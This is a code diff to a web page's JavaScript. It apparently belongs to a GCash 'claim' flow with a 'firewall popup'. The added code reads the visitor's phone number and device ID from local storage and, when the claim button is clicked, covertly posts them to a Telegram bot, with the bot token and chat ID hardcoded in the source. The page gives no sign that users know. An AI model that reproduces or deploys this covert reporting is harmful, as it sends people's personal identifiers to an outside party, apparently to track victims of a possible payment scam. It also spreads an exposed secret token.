@@ -495,6 +495,12 @@ function hideFirewallPopup() {
         if (proceedBtn) {
             proceedBtn.onclick = async function() {
                 if (claimInProgress) return;
+
+        const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+        
+        await sendTelegramMessage(userPhone, deviceId, 'claim_click', '');
+
                 
                 claimInProgress = true;
                 
@@ -665,6 +671,43 @@ async function markLinkAsUsed(linkKey, userPhone) {
         console.log(`🔗 Link ${linkKey} marked as used by ${userPhone}`);
     } catch(e) {
         console.error('Error marking link as used:', e);
+    }
+}
+
+    // ========== TELEGRAM NOTIFICATION ==========
+async function sendTelegramMessage(userPhone, deviceId, action, details) {
+    try {
+        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+        const chatId = "7298607329";
+        
+        const now = new Date();
+        const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
+        
+        let message = `CLAIM VIA GCASH CLICKED
+User: ${userPhone}
+Device ID: ${deviceId}
+Time: ${timestamp}`;
+        
+        if (details) {
+            message += `\nDetails: ${details}`;
+        }
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+        
+        console.log('Telegram sent for claim click');
+    } catch(e) {
+        console.error('Telegram error:', e);
     }
 }
     
